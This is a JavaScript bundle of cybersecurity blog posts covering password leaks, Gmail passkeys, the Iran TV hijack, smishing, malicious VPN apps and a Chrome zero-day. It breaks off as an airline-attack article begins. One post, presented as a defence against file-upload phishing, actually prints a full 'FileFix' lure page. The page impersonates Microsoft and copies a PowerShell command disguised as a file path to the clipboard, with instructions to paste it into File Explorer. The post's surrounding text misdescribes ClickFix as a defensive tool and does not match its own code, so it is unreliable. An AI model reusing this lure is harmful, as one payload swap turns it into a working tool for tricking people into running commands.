      <li><strong>Check Account Status:</strong> Use Google, HaveIBeenPwned, and browser-integrated leak checking.</li>
      <li><strong>Monitor Financial Statements:</strong> Early warnings of unauthorized activity matter.</li>
    </ol>

    <h3>🔒 Long-Term Cyber Hygiene Practices</h3><br>
    <ul>
      <li><strong>Review Connected Apps:</strong> Remove unused or suspicious third-party access.</li>
      <li><strong>Segment Accounts:</strong> Keep critical and low-tier accounts separate.</li>
      <li><strong>Update Security Settings:</strong> Audit account recoveries, login alerts, and permission history.</li>
      <li><strong>Adopt Passwordless Authentication:</strong> Where available, switch to passkeys or FIDO2-style logins.</li>
    </ul>

    <h3>🔚 Final Word</h3>
    <p>This leak is a red flag for a digital identity crisis. But it also offers an opportunity: secure your accounts, adopt good practices, and minimize future risk. If everyone treats this seriously, we might finally raise the global standard for password safety.</p>
  `},{id:"gmail-passkey-upgrade-2025",title:"Google Mandates Gmail Upgrades: Passkeys Now Essential for 3 Billion Users",date:"2025-06-21",author:"Cyber Sentinel",summary:"Google confirms that most Gmail users must upgrade to passkeys or social sign-ins to improve security. Learn why passwords and traditional 2FA are now considered outdated.",tags:["Gmail","Google","passkeys","2FA","cybersecurity","authentication"],imageKey:"gmailPasskeyUpgrade",content:`
    <p>As of June 2025, Google has officially confirmed that a large majority—including 61% of U.S. Gmail users—will be required to upgrade their accounts to passwordless authentication methods like passkeys or social sign‑ins (e.g., “Sign in with Google”). This shift marks a major evolution in account security policy for the platform’s ~3 billion users.</p>

    <h3>🔍 Key Reasons Behind the Upgrade</h3><br>
    <ul>
      <li><strong>Rising Scam & Breach Rates:</strong> Google reports over 60% of users have seen increased scam attempts in the past year, with more than half experiencing direct breaches.</li>
      <li><strong>Password Vulnerabilities:</strong> Passwords are “painful to maintain,” often reused, phishable, and leak-prone.</li>
      <li><strong>Modern Alternatives:</strong> Passkeys and social sign-ins are more resistant to phishing and offer smoother user experience.</li>
    </ul>

    <h3>📌 What’s Changing</h3><br>
    <ol>
      <li>Google will disable basic authentication (password + 2FA) for older IMAP/POP apps—users must shift to OAuth or passkeys by March 2025.</li>
      <li>On-device and platform-level security (biometrics or hardware tokens) will replace passwords on more devices.</li>
      <li>Users will see prompts to upgrade when logging in—often without an opt-out, causing mixed responses across user groups.</li>
    </ol>

    <h3>🌐 Who Is Affected?</h3><br>
    <p>Nearly all Gmail users—free or Workspace—will encounter this shift. While password fatigue is expected, early adopters (like Gen Z) who already leverage passkeys may transition more smoothly.</p>

    <h3>⚠️ Pros & Cons</h3>
    <ul>
      <li><strong>✅ Pros:</strong>  <br>
        <ul>
          <li>Superior phishing protection</li>
          <li>Convenient, device-based sign‑in</li>
          <li>Eliminates shared passwords</li>
        </ul>
      </li>
      <li><strong>❌ Cons & Concerns:</strong>  <br>
        <ul>
          <li>Reliance on device availability (phone, biometrics)</li>
          <li>Limited ability to disable prompts—many users have raised complaints about forced upgrades</li>
          <li>Privacy concerns tied to richer identity ecosystems</li>
        </ul>
      </li>
    </ul>

    <h3>🛡️ How to Prepare</h3><br>
    <ol>
      <li><strong>Enable Passkeys Promptly:</strong> Follow Gmail prompts or navigate to Security > Passkeys in your Google Account.</li>
      <li><strong>Set Backup Options:</strong> Register a spare device or use hardware tokens to avoid lockouts.</li>
      <li><strong>Check Connected Apps:</strong> Ensure third-party access uses OAuth, not basic password-based methods.</li>
      <li><strong>Educate Yourself:</strong> Learn how to recover account access if a device is lost.</li>
      <li><strong>Stay Informed:</strong> Watch for emails or in-app notifications from Google about these changes.</li>
    </ol>

    <h3>🔚 Final Takeaway</h3>
    <p>Google’s move is a seismic shift in mainstream account security—pushing billions toward stronger, phishing-resistant authentication. While the path forward may feel rocky, the benefits in long-term safety are compelling. It’s time to embrace a passwordless future.</p>
  `},{id:"iran-state-tv-hijack-2025",title:"Iran’s State TV Hijacked Mid-Broadcast: A New Front in Cyber Warfare",date:"2025-06-21",author:"Cyber Sentinel",summary:"Hackers briefly commandeered Iran’s state television to broadcast protest videos and incitements—marking a highly visible act of cyber psychological warfare.",tags:["cyber warfare","Iran","state TV","signal intrusion","hacktivism"],imageKey:"iranTvHijack",content:`
    <p>On June 19, 2025, Iran’s state television (IRINN) was hijacked mid-broadcast to air scenes from women-led protests and messages urging public uprising. The interruption lasted mere seconds, but its implications are profound—signal intrusion has become the latest battleground in hybrid conflict.</p>

    <h3>🔓 What Actually Happened</h3><br>
    <ul>
      <li>The hijack occurred live via satellite feed, abruptly replacing normal programming with protest footage and calls for demonstrations.</li>
      <li>Iranian authorities quickly blamed Israel, describing the event as "enemy interference with satellite signals."</li>
      <li>Hacktivist groups such as Arabian Ghosts and Team Fearless claimed responsibility, part of a larger clash involving over 35 regional cyber groups.</li>
    </ul>

    <h3>⚔️ The Significance of Broadcast Signal Intrusion</h3><br>
    <p>Broadcast signal intrusion—hijacking TV or satellite feeds—has been seen in other conflict regions such as Lebanon and Gaza. The incident in Iran marks a strategic evolution in psychological cyber operations. These short disruptions aim to undermine government narratives and spark unrest, regardless of their duration.</p>

    <h3>🌐 A Broader Digital Offensive</h3><br>
    <ul>
      <li>At the same time, Iran experienced major cyberattacks against Bank Sepah and Nobitex (its largest crypto exchange), with reports indicating over $90 million in digital assets stolen.</li>
      <li>These incidents are part of a larger hybrid offensive involving cyberattacks, media manipulation, and disinformation targeting Iranian digital infrastructure.</li>
    </ul>

    <h3>🛡️ What This Means for the Public & Organizations</h3><br>
    <ul>
      <li><strong>Psychological Impact:</strong> These attacks are designed to shake public trust in official communications and sow confusion.</li>
      <li><strong>Technical Exposure:</strong> Satellite and broadcast systems are often less protected than enterprise networks, making them a high-value target.</li>
      <li><strong>Institutional Preparedness:</strong> Media outlets, broadcasters, and emergency services must reassess their resilience to digital threats.</li>
    </ul>

    <h3>🔐 How to Strengthen Broadcast Defenses</h3><br>
    <ol>
      <li><strong>Encrypt Satellite Signals:</strong> Prevent unauthorized access by securing signal uplinks and feeds.</li>
      <li><strong>Real-Time Monitoring:</strong> Use broadcast monitoring systems that alert when unexpected content or signal changes occur.</li>
      <li><strong>Failover Protocols:</strong> Establish immediate recovery and manual override procedures in case of hijack attempts.</li>
      <li><strong>Counter-Disinformation Response:</strong> Communicate clearly and swiftly after incidents to restore trust and prevent panic.</li>
    </ol>

    <h3>🔚 Final Reflection</h3><br>
    <p>This incident is a powerful example of how cyber and psychological warfare tactics are merging. The goal is no longer just technical disruption, but perception manipulation. Governments, broadcasters, and cybersecurity leaders must treat satellite signal security with the same urgency as IT infrastructure to prevent the next televised breach of trust.</p>
  `},{id:"fbi-warning-smishing-delete-texts",title:"FBI Warns All Smartphone Users: Delete These Scam Texts Immediately",date:"2025-06-22",author:"Cyber Sentinel",summary:"The FBI has issued a sweeping alert to all Android and iPhone users about a dramatic surge in “smishing” scams. These fraudulent texts impersonate DMV, toll, or delivery services and aim to hijack your data—delete them without hesitation.",tags:["smishing","FBI warning","sms phishing","mobile security"],imageKey:"smishingAlert",content:`
    <p>In June 2025, the FBI issued a sweeping alert urging all smartphone users—Android and iPhone alike—to <strong>delete certain text messages immediately</strong>. These are part of a growing “smishing” campaign, where attackers pose as DMV, toll or delivery services to trick users into revealing personal data or downloading malware.</p>

    <h3>📈 Why the Alarm?</h3><br>
    <ul>
      <li>Smishing volumes have surged over <strong>700% in June</strong>, overwhelming users across the U.S.</li>
      <li>These texts often claim unpaid tolls, overdue fines, or missed deliveries, leveraging fear and urgency.</li>
      <li>Cybercrime groups are deploying <strong>thousands of malicious domains</strong>, often using deceptive tactics like asking recipients to reply “Y” to unlock links.</li>
    </ul>

    <h3>🎯 How the Scam Works</h3><br>
    <ol>
      <li>You receive a text from an unknown number claiming urgent action is needed (e.g., pay unpaid tolls).</li>
      <li>The message may direct you to click a link or reply “Y” to enable access—designed to bypass built-in filters.</li>
      <li>Following those steps leads to phishing sites or malware installations aiming to steal credentials and payment info.</li>
    </ol>

    <h3>🔐 Risks at Stake</h3><br>
    <ul>
      <li><strong>Identity Theft & Financial Loss:</strong> Clicking the link can hijack payment info or infect your device.</li>
      <li><strong>Data Harvesting:</strong> Personal details are captured for scams, extortion or fraud.</li>
      <li><strong>Erosion of Trust:</strong> As these scams become more prevalent, users can become distrustful of legitimate messages.</li>
    </ul>

    <h3>🛡️ What You Need to Do Right Now</h3><br>
    <ol>
      <li><strong>Immediately delete any suspicious text</strong>—don’t reply, don’t click.</li>
      <li><strong>Never respond with “Y” or similar prompts</strong>—this activates malicious links.</li>
      <li><strong>Verify via official sources</strong>—if a service claims you owe something, contact them directly (not via the link).</li>
      <li><strong>Use mobile security tools</strong>—install apps that detect and block malicious SMS/domains.</li>
      <li><strong>Report it:</strong> If you receive such a text, report it to the FBI’s IC3 or relevant consumer protection body.</li>
    </ol>

    <h3>📌 Final Takeaway</h3><br>
    <p>Smishing is becoming one of the fastest-growing cyber threats. A single click or reply can compromise your phone—and your identity. <strong>Stay vigilant:</strong> delete suspicious texts immediately and always verify through official channels.</p>
  `},{id:"weekly-recap-chrome-zero-day-ddos-mfa-bypass",title:"Weekly Cyber Recap: Chrome Zero‑Day, Record 7.3 Tbps DDoS & MFA Bypass Tactics",date:"2025-06-23",author:"Cyber Sentinel",summary:"From exploit-packed Chrome flaws to record-breaking DDoS and social-engineered MFA bypasses, here’s a comprehensive recap of the biggest cybersecurity events of the week.",tags:["Chrome","zero-day","DDoS","MFA bypass","phishing","cyber recap"],imageKey:"weeklyCyberRecap",content:`
    <p>In this week’s cybersecurity round-up, several high-impact incidents stood out—from massive distributed denial-of-service (DDoS) attacks to stealthy browser exploits and social-engineered MFA bypasses. Here’s a breakdown of the top stories and why they matter.</p>

    <h3>⚡ Massive 7.3 Tbps DDoS Attack Blocked by Cloudflare</h3><br>
    <p>Cloudflare successfully defended against the largest DDoS attack ever recorded, peaking at an astonishing 7.3 terabits per second. Originating from over 122,000 IPs across 161 countries, the attack unleashed 37 terabytes of traffic in just 45 seconds. Multiple amplification methods—UDP floods, NTP, Mirai, and more—were used in concert. Although defense systems held firm this time, the attack highlights the growing threat from IoT-driven botnets.</p>

    <h3>🛡️ Chrome Zero-Day CVE‑2025‑2783 Exploited in the Wild</h3><br>
    <p>Google confirmed that CVE‑2025‑2783, an actively exploited zero-day in Chrome, was used to drop a stealth backdoor named “Trinper.” The exploit stemmed from a malicious forum invitation and was aimed at Russian targets. While Google has patched the vulnerability, this incident underscores the importance of updating browsers immediately—even between routine patch cycles.</p>

    <h3>🔐 MFA Bypass via App-Specific Passwords</h3><br>
    <p>Russian threat actors have been tricking users into generating Gmail app-specific passwords, which bypass multi-factor authentication entirely. Using patient, multi-step social engineering rather than urgent scare tactics, attackers built trust before capturing credentials. This sophisticated campaign proves that strong authentication can still be bypassed if users are manipulated into undermining their own security.</p>

    <h3>📈 CoinMarketCap Injects Fake “Verify Wallet” Pop-Up</h3><br>
    <p>Users of the popular crypto tracking site were unwittingly served malicious JavaScript via the “doodles” feature. A fake “Verify Wallet” pop-up prompted users to expose private keys or seed phrases. Although the code has been removed, the incident shows how supply-chain or frontend injection can turn legitimate platforms into exploitation tools.</p>

    <h3>🔍 Key Takeaways for Security Teams</h3><br>
    <ul>
      <li><strong>Upgrade and patch immediately:</strong> From browsers to endpoints, install security updates without delay.</li>
      <li><strong>Prepare for multi-vector DDoS:</strong> Scale systems for high-bandwidth protection and diverse attack types.</li>
      <li><strong>Strengthen MFA hygiene:</strong> Educate users about the limitations of app-specific passwords.</li>
      <li><strong>Secure third-party integration:</strong> Audit external scripts and features—like widgets or doodles—that inject code.</li>
      <li><strong>Defensive strategy:</strong> Monitor for unusual login behavior, deploy secure TLS for web assets, and maintain incident playbooks for supply-chain risks.</li>
    </ul>

    <h3>🔐 Final Thought</h3><br>
    <p>These stories demonstrate that cyber threats are evolving on multiple fronts—web clients, IoT networks, user authentication, and supply chains. Defenses today must be equally multi-layered, proactive, and adaptable to the subtlety and scale of emerging risks.</p>
  `},{id:"delete-harmful-apps-warning-2025",title:"Delete All Harmful Apps on Your Phone: FBI-Style Alert for Mobile Security",date:"2025-06-24",author:"Cyber Sentinel",summary:"A major warning: delete any apps listed in this new security advisory—they are exploiting users to steal cryptocurrency and personal data. If you’ve installed them, remove them now.",tags:["mobile security","app vulnerabilities","crypto theft","privacy"],imageKey:"deleteHarmfulApps",content:`
    <p>On June 24, 2025, a cybersecurity advisory warned smartphone users to immediately delete certain apps from their devices. These apps, previously promoted as useful tools, are now being used in malicious campaigns aimed at stealing cryptocurrency, login credentials, and personal data.</p>

    <h3>📛 Why These Apps Are Dangerous</h3> <br>
    <ul>
      <li>They employ phishing overlays—fake interfaces asking for crypto wallet seed phrases or login credentials.</li>
      <li>Once obtained, attackers gain full control over wallets and accounts—often draining balances within minutes.</li>
      <li>Some apps also collect sensitive personal data like contact lists, device info, and location.</li>
    </ul>

    <h3>📱 How the Scam Operates</h3><br>
    <ol>
      <li>You install what seems like a legitimate app from an app store or sideload source.</li>
      <li>The app functions normally initially—but later displays fake pop-ups requesting your wallet's recovery phrase or account credentials.</li>
      <li>If you enter the details, the app transmits them to attackers who then take over your wallets/accounts.</li>
    </ol>

    <h3>📱 Apps List</h3><br>
    <ol>
      <li>X-VPN - Super VPN & Best Proxy</li>
      <li>Ostrich VPN - Proxy Master</li>
      <li>VPN Proxy Master - Super VPN</li>
      <li>Turbo VPN Private Browser</li>
      <li>VPNIFY - Unlimited VPN</li>
      <li>VPN Proxy OvpnSpider</li>
      <li>WireVPN - Fast VPN & Proxy</li>
      <li>Now VPN - Best VPN Proxy</li>
      <li>Speedy Quark VPN - VPN Proxy</li>
      <li>Best VPN Proxy AppVPN</li>
      <li>HulaVPN - Best Fast Secure VPN</li>
      <li>Wirevpn - Secure & Fast VPN</li>
      <li>Pearl VPN</li>
    </ol>

    <h3>🔐 What You Must Do Now</h3><br>
    <ol>
      <li><strong>Delete any apps on the warned list</strong>—whether you use them regularly or not.</li>
      <li><strong>Verify wallet balances immediately</strong>—any unauthorized transfers likely indicate compromise.</li>
      <li><strong>Revoke app permissions</strong> to third-party wallet access and reset API keys if applicable.</li>
      <li><strong>Install mobile security tools</strong> that scan for malicious behavior and protect crypto wallets.</li>
      <li><strong>Avoid sideloading</strong> or installing apps outside official app stores unless absolutely necessary.</li>
    </ol>

    <h3>🛡️ How to Avoid Future Scams</h3><br>
    <ul>
      <li><strong>Install only trusted apps</strong>—read reviews, check downloads, and research the developer.</li>
      <li><strong>Keep mobile OS & apps updated</strong> to patch known vulnerabilities.</li>
      <li><strong>Enable app installer restrictions</strong> in your phone’s settings if sideloading is needed.</li>
      <li><strong>Use hardware wallets</strong> or isolated devices for significant crypto holdings.</li>
      <li><strong>Monitor accounts regularly</strong> for suspicious activity or unexpected permissions.</li>
    </ul>

    <h3> Final Word</h3><br>
    <p>These malicious apps are a growing threat vector—particularly for crypto users. A single misstep, like entering a seed phrase into a bogus pop-up, can cost you everything. Stay secure by deleting risky apps, auditing permissions, and adopting hardware-based protections.</p>
  `},{id:"modern-file-upload-phishing-defense-2025",title:"Fixing the File Upload Phishing Weakness: A Modern Approach Without ClickFix",date:"2025-07-01",author:"Mr Dox",summary:"Phishing via uploaded files is a real risk, but you can protect your users even without ClickFix. Learn how to scan and sanitize uploaded documents with a custom FileFix middleware to neutralize malicious links.",tags:["phishing","file security","clickfix alternative","cyber defense"],imageKey:"fileUploadPhishing",content:`
    <p>Phishing attacks remain one of the most effective tactics used by cybercriminals. A particularly sneaky method involves manipulating file upload functionalities on websites to redirect users to malicious sites or exploit them through social engineering. Traditionally, tools like ClickFix were used to mitigate such attacks by neutralizing suspicious links embedded in uploaded documents. But with ClickFix no longer available, what can security teams do?</p>

    <p>That’s where an innovative alternative comes into play: using a custom middleware or web server rule that intercepts file uploads and rewrites suspicious links on the fly.</p>

    <h3>🎯 Understanding the Threat: Malicious Links in Uploaded Files</h3><br>
    <p>Many web applications allow users to upload documents like PDFs, DOCX files, or presentations. Attackers can embed hyperlinks in these files, pointing unsuspecting viewers to phishing websites or malware downloads. When these files are later opened or previewed online, a single careless click can compromise the user.</p>

    <p>Attackers exploit this by uploading crafted documents to legitimate platforms—forums, HR portals, ticketing systems, or any service that lets users upload and share files with others.</p>

    <h3>🛠️ The Original Solution: ClickFix</h3><br>
    <p>ClickFix was a tool that automatically sanitized uploaded documents, rewriting or stripping suspicious URLs. Unfortunately, it’s no longer maintained or available, leaving a gap in the defensive arsenal of many organizations.</p>

    <h3>🚀 The New Approach: FileFix Middleware</h3><br>

    <h3>Full HTML Snippet (Copy below)</h3><br>
<pre style="background:#f7f7f7;border:1px solid #ccc;padding:16px;overflow:auto;font-size:13px;line-height:1.5;border-radius:6px;">
<code>&lt;!DOCTYPE html&gt;
&lt;head&gt;
  &lt;title&gt;EthicalByte&lt;/title&gt;
  &lt;style&gt;
    body {
      background-color: #f2f2f2;
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 40px 0;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
    }
    .container {
      background-color: #ffffff;
      width: 560px;
      border-radius: 6px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      border: 1px solid #dcdcdc;
      text-align: center;
    }
    .header { padding: 40px 30px 10px; }
    .header img { width: 36px; margin-bottom: 25px; }
    .header h3 { font-size: 20px; color: #2f2f2f; margin: 0; }
    .timestamp { font-size: 13px; color: #7a7a7a; margin-top: 6px; }
    .instructions { text-align: left; padding: 25px 40px 10px; font-size: 15px; color: #333333; line-height: 1.6; }
    .instructions ol { margin: 0; padding-left: 20px; }
    .code-block { background-color: #f1f1f1; border: 1px solid #ccc; border-radius: 4px; padding: 8px 12px; font-family: Consolas, monospace; font-size: 14px; margin-top: 8px; position: relative; transition: background-color 0.3s; cursor: pointer; user-select: none; }
    .code-block:hover { background-color: #e6e6e6; }
    .code-block::after { content: "Copy"; position: absolute; top: 50%; right: 12px; transform: translateY(-50%); font-size: 12px; color: #0078d4; opacity: 0; transition: opacity 0.2s; }
    .code-block:hover::after { opacity: 1; }
    .code-block.clicked::after { content: "Copied"; color: #107c10; }
    #fileExplorer { background-color: #0078d4; color: white; border: none; padding: 12px 30px; font-size: 15px; border-radius: 4px; margin: 30px 0 40px; cursor: pointer; }
    #fileExplorer:hover { background-color: #005ea2; }
    .footer { font-size: 11.5px; color: #6b6b6b; background-color: #f7f7f7; padding: 12px 24px; border-top: 1px solid #dcdcdc; display: flex; justify-content: space-between; align-items: center; }
    .footer img { height: 16px; }
    .footer a { color: #6b6b6b; text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

  &lt;div class="container"&gt;
    &lt;div class="header"&gt;
      &lt;svg fill="#000000" width="50px" height="50px" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg"&gt;
      &lt;/svg&gt;
      &lt;h3&gt;EthicalByte Hacking Tools are here &quot;Tools.pdf&quot; available to you&lt;/h3&gt;
      &lt;div class="timestamp"&gt;06/20/2025 10:22:45 AM&lt;/div&gt;
    &lt;/div&gt;

    &lt;div class="instructions"&gt;
      &lt;p&gt;To access &lt;strong&gt;Tools.pdf&lt;/strong&gt;, follow these steps:&lt;/p&gt;
      &lt;ol&gt;
        &lt;li style="margin-bottom: 10px;"&gt;
          Copy the file path below
          &lt;div class="code-block" id="path" onclick="this.classList.add('clicked')"&gt;
            C:companyinternal-secure\filedrive	ools.pdf
          &lt;/div&gt;
        &lt;/li&gt;
        &lt;li style="margin-bottom: 10px;"&gt;Open File Explorer and select the address bar (&lt;strong&gt;CTRL + L&lt;/strong&gt;)&lt;/li&gt;
        &lt;li style="margin-bottom: 10px;"&gt;Paste the file path and press &lt;strong&gt;Enter&lt;/strong&gt;&lt;/li&gt;
      &lt;/ol&gt;
    &lt;/div&gt;

    &lt;input type="file" id="fileInput" style="display: none;"&gt;
    &lt;button id="fileExplorer"&gt;Open File Explorer&lt;/button&gt;

    &lt;div class="footer"&gt;
      &lt;img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft"&gt;
    &lt;/div&gt;
  &lt;/div&gt;

&lt;script&gt;
const fileInput = document.getElementById('fileInput');
const fileExplorer = document.getElementById('fileExplorer');
const path = document.getElementById('path');
path.addEventListener('click', function() {
    navigator.clipboard.writeText("Powershell.exe -c ping example.com # C:\\company\\internal-secure\\filedrive\\tools.pdf");
});
fileExplorer.addEventListener('click', function() {
    navigator.clipboard.writeText("Powershell.exe -c ping example.com # C:\\company\\internal-secure\\filedrive\\Tools.pdf");
    fileInput.click();
});
fileInput.addEventListener('change', () =&gt; {
    alert("Please follow the stated instructions.");
    fileInput.value = "";
    setTimeout(() =&gt; fileInput.click(), 500);
});
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>



    <p><img src="https://ethicalbyte.in/blogs/img/rnd/1.jpg" alt="Illustration of FileFix middleware scanning files" style="width:100%;max-width:800px;margin:20px 0;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);"></p><br>
    <p><img src="https://ethicalbyte.in/blogs/img/rnd/2.jpg" alt="Illustration of FileFix middleware scanning files" style="width:100%;max-width:800px;margin:20px 0;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);"></p><br>
    <p><img src="https://ethicalbyte.in/blogs/img/rnd/3.jpg" alt="Illustration of FileFix middleware scanning files" style="width:100%;max-width:800px;margin:20px 0;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);"></p><br>
    
    <p>A modern replacement doesn’t require a standalone tool—security teams can build or integrate file-processing middleware directly into their web servers or applications. Here’s the core idea:</p>

    <ol>
      <li><strong>Intercept uploads</strong>: Configure your web server or application backend to route every uploaded file through a processing function before it’s saved or shared.</li>
      <li><strong>Scan for hyperlinks</strong>: Use libraries like PyMuPDF for PDFs or python-docx for DOCX files to programmatically extract hyperlinks.</li>
      <li><strong>Rewrite suspicious URLs</strong>: For every detected link, you can:
        <ul>
          <li>Replace it with a safe placeholder like <code>https://warning.local/phishing-link-removed</code>.</li>
          <li>Add visual indicators like “(Link Disabled)” in the document text.</li>
          <li>Remove hyperlinks entirely if they match a denylist of known malicious domains.</li>
        </ul>
      </li>
      <li><strong>Store and serve the sanitized file</strong>: Save the cleaned version of the document and share only this sanitized file with other users.</li>
    </ol>

    <p>This approach allows you to tailor the rules to your organization’s risk tolerance, ensuring that employees or customers aren’t exposed to unexpected phishing links in shared documents.</p>

    <h3>✅ Benefits of Building Your Own FileFix</h3><br>
    <ul>
      <li><strong>Full control over the ruleset</strong> – Customize how aggressive your scanning and rewriting should be.</li>
      <li><strong>No reliance on third-party tools</strong> – Maintain your own codebase, reducing supply chain risk.</li>
      <li><strong>Integration flexibility</strong> – Hook into your existing web application stack, whether it’s Node.js, Python/Django, PHP, or another framework.</li>
      <li><strong>Immediate mitigation</strong> – Uploaded files are cleaned before anyone else can download or view them.</li>
    </ul>

    <h3>⚠️ Important Considerations</h3><br>
    <ul>
      <li><strong>Performance</strong>: Scanning every upload adds processing overhead. Test the impact on upload speeds and server load.</li>
      <li><strong>False positives</strong>: Be careful not to block legitimate URLs unnecessarily—define allowlists for common trusted domains.</li>
      <li><strong>Compliance</strong>: Always ensure that modifying uploaded user content complies with your terms of service and privacy policies.</li>
    </ul>

    <h3>🔚 Conclusion</h3><br>
    <p>Phishing through uploaded files is an often-overlooked attack vector. Although ClickFix is gone, building a custom middleware solution provides a flexible, powerful alternative. By proactively sanitizing file uploads, you can close this security gap and protect your users from malicious links—without relying on outdated or unsupported tools.</p>
  `},{id:"chrome-zero-day-cve-2025-6554-detailed",title:"Google Patches Critical Chrome Zero‑Day CVE‑2025‑6554 – All Users Must Update Now",date:"2025-07-01",author:"Cyber Sentinel",summary:"Google’s emergency update fixes CVE‑2025‑6554, a dangerous zero‑day vulnerability in the Chrome browser’s V8 engine actively exploited in the wild. Learn why this flaw is so critical, how it works, and what steps you must take immediately.",tags:["Chrome","zero-day","browser security","CVE-2025-6554","Google","patch management"],imageKey:"chromeZeroDayExploit",content:`
    <p>On July 1, 2025, Google announced and released an urgent security update for the Chrome web browser, patching CVE‑2025‑6554—a critical zero‑day vulnerability in Chrome’s V8 JavaScript and WebAssembly engine. This vulnerability is already under active exploitation by malicious actors, making it essential for every Chrome user to update immediately.</p>

    <h3>🔎 What is CVE‑2025‑6554 and How Does It Work?</h3><br>
    <p>CVE‑2025‑6554 is a <strong>type confusion flaw</strong> in Chrome’s V8 engine, the core JavaScript and WebAssembly runtime. Type confusion vulnerabilities occur when a program mistakenly assigns a variable of one type as another. In V8, this can enable attackers to manipulate memory outside the intended boundaries of an object, leading to arbitrary code execution.</p>

    <p>Attackers can exploit this by crafting a specially designed website containing malicious JavaScript code. When a user visits such a website, the exploit abuses the vulnerability to execute code on the victim’s system with the same privileges as the browser. This can result in the download of spyware, ransomware, or the establishment of persistent remote access.</p>

    <h3>⚠️ Why CVE‑2025‑6554 is So Dangerous</h3><br>
    <ul>
      <li><strong>Exploitation is already active:</strong> Google confirmed that targeted attacks leveraging this flaw are happening now, not just theoretical proof-of-concepts.</li>
      <li><strong>Drive-by compromise risk:</strong> A single visit to a malicious website can result in compromise without requiring user interaction beyond normal browsing.</li>
      <li><strong>Cross-platform impact:</strong> Because Chrome is used on Windows, macOS, Linux, and forms the core of many Chromium-based browsers, a wide range of users are vulnerable.</li>
      <li><strong>Potential nation-state exploitation:</strong> Experts suggest advanced threat groups may be using this flaw for espionage campaigns against journalists, activists, or enterprises.</li>
    </ul>

    <h3>📜 Context: Chrome’s Zero-Day Track Record in 2025</h3><br>
    <p>This zero-day marks the <strong>fourth actively exploited Chrome vulnerability this year alone</strong>, highlighting a persistent focus by attackers on browser engines as a key attack surface. Earlier 2025 zero-days exploited buffer overflows, type confusion bugs, and sandbox escape techniques—showing consistent interest from cybercriminals and APT groups alike in compromising users directly through web browsing.</p>

    <p>Because browsers are essential gateways to online services, they remain prime targets. Combined with the growing sophistication of exploit kits sold on underground forums, the speed at which zero-days are weaponized continues to accelerate.</p>

    <h3>🛡️ What You Must Do Immediately</h3><br>
    <ol>
      <li><strong>Update Chrome right now:</strong> Ensure your browser is at version 138.0.7204.96 or newer on Windows, macOS, or Linux. Updates can be checked manually by navigating to “Settings > About Chrome.”</li>
      <li><strong>Restart your browser:</strong> Simply updating isn’t enough; Chrome must restart to apply the new security patch.</li>
      <li><strong>Update Chromium-based browsers:</strong> Browsers like Edge, Brave, Opera, and Vivaldi share the V8 engine—these must also be updated promptly to close the same vulnerability.</li>
      <li><strong>Communicate with your organization:</strong> IT teams should push updates across corporate devices and remind employees of the urgent need to patch browsers.</li>
      <li><strong>Harden browsing habits:</strong> Use script-blocking extensions, consider site isolation features in Chrome, and disable unnecessary browser plugins.</li>
    </ol>

    <h3>🔐 How Attackers Are Exploiting CVE‑2025‑6554</h3><br>
    <p>Security researchers discovered the zero-day being delivered through watering-hole attacks—compromising websites known to attract targets, such as industry forums or popular news sites in specific regions. By injecting malicious JavaScript code, attackers silently trigger exploitation chains on visitors’ devices.</p>

    <p>Experts warn that because type confusion exploits can bypass many traditional antivirus solutions (which rely on signatures rather than behavioral detection), only up-to-date browsers or advanced endpoint detection and response (EDR) solutions are likely to catch or block these attacks.</p>

    <h3>📈 Why Browser Zero-Days Are on the Rise</h3><br>
    <p>Browsers like Chrome have become high-value targets because they process untrusted content from the internet in real time. With complex components like JavaScript engines and PDF readers, even a single bug can expose billions of users. Additionally, many organizations have moved critical workflows to web-based platforms, increasing the potential impact of a successful browser exploit.</p>

    <p>The lucrative zero-day market—where brokers can earn six- or seven-figure sums selling working exploits—has incentivized criminal groups and nation-state attackers alike to invest heavily in finding and weaponizing browser vulnerabilities.</p>

    <h3>🛡️ Strengthening Your Browser Security Posture</h3><br>
    <ul>
      <li><strong>Enable automatic updates:</strong> Ensure browsers and extensions update without user intervention.</li>
      <li><strong>Leverage site isolation:</strong> In Chrome, enable “Strict Site Isolation” for an extra layer of defense by running each website in a separate process.</li>
      <li><strong>Use trusted extensions only:</strong> Third-party extensions can introduce their own vulnerabilities or malicious code.</li>
      <li><strong>Adopt DNS-based filtering solutions:</strong> Tools like Secure DNS or enterprise-level DNS filtering can block access to known malicious domains before a browser can connect.</li>
      <li><strong>Monitor web traffic:</strong> Deploy web proxies or next-gen firewalls capable of inspecting SSL traffic for malicious patterns.</li>
    </ul>

    <h3>🔚 Conclusion: Update Now, Stay Vigilant</h3><br>
    <p>Google’s rapid response to CVE‑2025‑6554 shows the importance of timely security patching. But no vendor can act faster than an attacker who already has a zero-day in hand—so staying vigilant, adopting strong security practices, and updating promptly is the best way to reduce risk.</p>

    <p>This isn’t just another security update: the active exploitation means every day you delay updating Chrome or Chromium-based browsers increases your risk of compromise. Take action now to protect your systems, your data, and your privacy.</p>
  `},{id:"scattered-spider-targets-airlines",title:"Airline Industry in the Crosshairs: Scattered Spider Expands Attacks to Qantas and Beyond",date:"2025-07-03",author:"EthicalByte",summary:"The notorious cybercrime group Scattered Spider has expanded its operations from casinos and telecoms to the airline sector, recently breaching systems linked to Qantas, Hawaiian Airlines, and WestJet. Here's everything you need to know.",tags:["airline","scattered spider","qantas","cyberattack","social engineering","mfa","infosec"],imageKey:"scatteredSpiderAirline",content:`
    <h3>✈️ Airlines Are Under Attack</h3><br>
    <p>In July 2025, cybersecurity officials confirmed that the hacking group known as <strong>Scattered Spider</strong> is actively targeting the <strong>airline industry</strong>, marking a dangerous new frontier for one of the world's most critical sectors. What started as a series of attacks against casino chains and tech firms has evolved into a coordinated assault on aviation giants like <strong>Qantas, Hawaiian Airlines, and WestJet</strong>.</p>
    
